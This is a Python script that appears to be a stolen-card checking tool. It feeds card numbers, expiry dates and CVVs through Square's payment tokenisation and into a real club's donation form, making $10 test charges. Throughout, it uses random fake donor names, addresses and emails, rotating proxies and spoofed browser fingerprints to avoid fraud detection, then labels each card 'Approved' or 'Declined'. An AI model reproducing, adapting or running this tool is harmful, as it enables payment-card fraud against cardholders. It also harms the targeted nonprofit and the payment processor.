
import base64
import json
import ssl
import certifi
import aiohttp
import asyncio
import random
import platform
from bs4 import BeautifulSoup
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: City = genaddr['city']
except KeyError: City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
async def CMDti(cc, proxyrand):
    timeout=20
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]

        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#   
                try:     
                    session.headers.update({
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        #'Referer': 'https://heartbeatofchampions.org/',
                        #'Alt-Used': 'heartbeatofchampions.org',
                        'Connection': 'keep-alive',
                    })
                    async with session.get('https://www.chinobasqueclub.com/donations/general-fund/', proxy=str(proxyrand), timeout=18) as resp:        
                        response = await resp.text()
                        soup = BeautifulSoup(response , 'lxml')
                        formid = soup.find("input", {"name": "give-form-id"})["value"]
                except UnboundLocalError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 01. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 01. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 01. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"
                try :
                    data = {
                        'action': 'give_donation_form_reset_all_nonce',
                        'give_form_id': formid,
                    }
                    async with session.post('https://www.chinobasqueclub.com/wp-admin/admin-ajax.php', data=data, proxy=str(proxyrand), timeout=18) as resp:       
                        response = await resp.json()  
                        give_form_hash = response['data']['give_form_hash']
                except UnboundLocalError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except TypeError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 02. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    async with session.get('https://pci-connect.squareup.com/payments/hydrate?applicationId=sq0idp-T6PJbly5F5Mn3H19ZfvkFg&hostname=www.chinobasqueclub.com&locationId=4GKJBVES8S36K&version=1.48.3', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        sessionId = response['sessionId']
                except UnboundLocalError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 03. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                except KeyError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 03. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"

                #---------------------------------REQUEST NUMERO 4------------------------------#
                #---------------------------------REQUEST NUMERO 4------------------------------#
                try :  
                    json_data = {
                        'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0","language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
                        'fingerprint': '1388fd41484221448ab3032f9c0d99ac',
                        'timezone': '300',
                        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                        'version': 'aec7810a345b92cbd17fd1a124d743825fa8f4fa',
                        'website_url': 'https://www.chinobasqueclub.com/',
                        'client_id': 'sq0idp-T6PJbly5F5Mn3H19ZfvkFg',
                        'browser_fingerprint_by_version': [
                            {
                                'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0","language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"1388fd41484221448ab3032f9c0d99ac"}',
                                'payload_type': 'fingerprint-v1',
                            },
                            {
                                'payload_json': '{"components":{"language":"es-ES","color_depth":24,"resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unspecified","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"00d7533fb343e3fd354adb899d6340db"}',
                                'payload_type': 'fingerprint-v1-sans-ua',
                            },
                        ],
                    }

                    async with session.post('https://connect.squareup.com/v2/analytics/token', json=json_data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        token = response['token']
                except UnboundLocalError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 04. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 04. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 04. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 5------------------------------#
                #---------------------------------REQUEST NUMERO 5------------------------------#
                try :
                    if mes[0:1] == '1': mesnew = mes
                    else : mesnew = mes[1:2]
                    json_data = {
                        'client_id': 'sq0idp-T6PJbly5F5Mn3H19ZfvkFg',
                        'location_id': '4GKJBVES8S36K',
                        'payment_method_tracking_id': '9432683f-af12-32a8-a30c-ceb8b8227365',
                        'session_id': sessionId,
                        'website_url': 'www.chinobasqueclub.com',
                        'analytics_token': token,
                        'card_data': {
                            'billing_postal_code': Zip_Code,
                            'cvv': ' ',
                            'exp_month': int(mesnew),
                            'exp_year': int(ano),
                            'number': ccnum,
                        },
                    }
                    async with session.post('https://pci-connect.squareup.com/v2/card-nonce?_=1682862113498.3533&version=1.48.3', json=json_data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.json()
                        card_nonce = response['card_nonce']
                except UnboundLocalError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 05. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 05. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 05. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 6------------------------------#
                #---------------------------------REQUEST NUMERO 6------------------------------#
                try :
                    urlpage = 'https://www.chinobasqueclub.com/donations/general-fund/'
                    data = {
                        'give-fee-amount': '0.34',
                        'give-fee-mode-enable': 'true',
                        'give-payment-mode': 'square',
                        'give-fee-status': 'enabled',
                        'give-honeypot': '',
                        'give-form-id-prefix': f'{formid}-1',
                        'give-form-id': f'{formid}',
                        'give-form-title': 'No Better Time Than the Present',
                        'give-current-url': urlpage,
                        'give-form-url': urlpage,
                        'give-form-minimum': '10.00',
                        'give-form-maximum': '999999.99',
                        'give-form-hash': give_form_hash,
                        'give-price-id': 'custom',
                        'give-amount': '10.00',
                        'give-fee-recovery-settings': '{"fee_data":{"all_gateways":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"forced_opt_in","is_fee_mode":true,"fee_recovery":true}',
                        'payment-mode': 'square',
                        'give_first': first,
                        'give_last': last,
                        'give_email': CorreoRand,
                        'in_memoriam_enter_name': '',
                        'where_would_you_like_your_gift_to_be_designated': 'General Fund',
                        'billing_country': 'US',
                        'card_address': address,
                        'card_address_2': '',
                        'card_city': City,
                        'card_state': State,
                        'card_zip': Zip_Code,
                        'card_nonce': '',
                        'give_agree_to_terms': '1',
                        'give_mailchimp_signup': 'on',
                        'give_action': 'purchase',
                        'give-gateway': 'square',
                        'nds-pmd': '{"jvqtrgQngn":{"oq":"704:927:1936:1056:1920:1040","wfi":"flap-1","ji":"2.3.1","oc":"2501pp0s72219oop","fe":"1080k1920 24","qvqgm":"300","jxe":229001,"syi":"snyfr","si":"si,btt,zc4,jroz","sn":"sn,zcrt,btt,jni","us":"262pp79s6362q93o","cy":"Jva32","sg":"{\\"zgc\\":0,\\"gf\\":snyfr,\\"gr\\":snyfr}","sp":"{\\"gp\\":gehr,\\"ap\\":gehr}","sf":"gehr","jt":"540os5rn8p7q7q22","sz":"soq955n35poq4921","vce":"apvc,0,6451prop,2,1;fg,0,tvir-nzbhag,6,,0,,0;zz,139,n4,202,;xx,3pn,6,tvir-nzbhag;ss,0,tvir-nzbhag;zzf,2p,0,n,67 0,36n7 63ss,1r07,1r5n,-41432,25s27,-5p8n;zp,3q,74,47n,tvir-nzbhag;zp,85,74,47n,tvir-nzbhag;zp,78,74,47n,tvir-nzbhag;xq,37,0;xh,4s,0;zzf,232,3s2,n,ss 2q6,92q 1381,5s9,608,-6q60,7701,2r8;so,39,tvir-nzbhag;zp,58,90,51p,;zzf,362,3s3,n,33 0,68 288,57,57,-195s,424,-2s9;zzf,3s5,3s5,n,ABC;zzf,3s3,3s3,n,ABC;zz,r3,95,51p,tvir-sbez-19258-1;zzf,30r,3s1,n,3n0 5p,3630 4psr,13sn,1428,-3nq7p,264op,-ns;zzf,3s6,3s6,n,ABC;zzf,3s2,3s2,n,ABC;zzf,113r,113r,n,ABC;zzf,3s2,3s2,n,ABC;zz,79ps,1o1,22r,;gf,0,nsq4;zp,37s,rq,5qr,tvir-svefg;zp,82,rq,5qr,tvir-svefg;zp,2o4,1n3,5p8,tvir-ynfg;zp,78,1n3,5p8,tvir-ynfg;zp,250,rn,64q,tvir-va_zrzbevnz_ragre_anzr-19258-1;zp,108,r8,629,tvir-rznvy;zp,8s,r8,629,tvir-rznvy;zzf,1qr,86p1,32,1n r9,271 4pnr,409,286o,-141r8,p68s,79;zz,359,n5,88s,pneq_nqqerff_2;zz,16r1,201,738,tvir_frpher_fvgr_jenccre;zp,579,p4,82n,pneq_nqqerff;zp,7p,p2,82r,pneq_nqqerff;zp,353,95,8qp,pneq_pvgl;zp,338,9n,903,pneq_pvgl;zzf,6r,2728,32,0 2r,n1s 5184,62n,3qpp,-19oq8,16r1r,-7s;zp,r3,0,660,pneq_fgngr;zp,2so,0,660,;zz,15,44,7rq,ovyyvat_pbhagel;zp,177,175,913,pneq_mvc;zp,n0,175,913,pneq_mvc;zp,4p3,o9,n0s,tvir-chepunfr-ohggba;gf,0,rroo;zp,73q,n9,6p5,tvir_chepunfr_sbez_jenc;zp,159,0,68p,tvir-jurer_jbhyq_lbh_yvxr_lbhe_tvsg_gb_or_qrfvtangrq-19258-1;zp,161,0,68p,;zz,222,p9,8q0,pneq_pvgl;zp,274,6p,9qo,;zp,s2,78,9so,tvir-chepunfr-ohggba;zp,p6s,27,952,tvir_nterr_gb_grezf-19258;zzf,80,273o,32,1n 0,3os 966s,r95,921s,-2r630,2p601,1n;zp,1os,n5,n22,;zp,152,n2,n1n,tvir-chepunfr-ohggba;","vp":"0,qr;","ns":"","qvg":""},"jg":"1.j-952168.1.2.S-AsDt-ImI0QFmxrFYgm4t,,.U6O0NEwbu6MlPsqXipOxIGs5i369kctt9M7u20QlR-hvkycMcmA1JkZZ2dZDB-lDeQfi6lFZy75IIwGZauCyqVBc5vrFKOBIdhKZeRVgtFYQTQ2g4pdmbvyrqdxbr5VR6Z1RIo-fN6AfPvdlV9PqWOWJg4uO4HoYXXLzYu-ew4MA8swDSZ2xHOZNqPtjqcoCeoIup6i8c4ZRnEp5uQmO93nNLHk0z8vvfhJwnA59O4N5R6duIpmi4ZDThu7BbknD"}',
                        'square-card-nonce': card_nonce,
                    }
                    async with session.post(f'{urlpage}?payment-mode=square&form-id={formid}', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                except UnboundLocalError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 07. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 07. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return '[ ERROR ⚠ ]','An unexpected error occurred in request 07. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"   
                #------------ ---------------------CHECCK REQUESTS------------------------------#
                if (int(response.find('Donation Confirmation')) > 0):
                    return "Approved", "Charged (10$)"
                elif (int(response.find('TRANSACTION_LIMIT')) > 0):
                    return "Approved", "TRANSACTION_LIMIT"
                elif int(response.find('Authorization error')) > 0 :
                    Message = (response.split('\t\t\t\t\t\t<p><strong>Error</strong>: Authorization error: ')[1]).split('</p>')[0]
                    Message = Message.replace("'", "")
                    return "Declined", Message
                else :
                    return '[ ERROR ⚠ ]',"An unexpected error occurred in response. It was not generated correctly. ⚠️"
            except (aiohttp.client_exceptions.ServerDisconnectedError):
                return '[ ERROR ⚠ ]',"An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError):
                return '[ ERROR ⚠ ]',"An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError):
                return '[ ERROR ⚠ ]',"An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()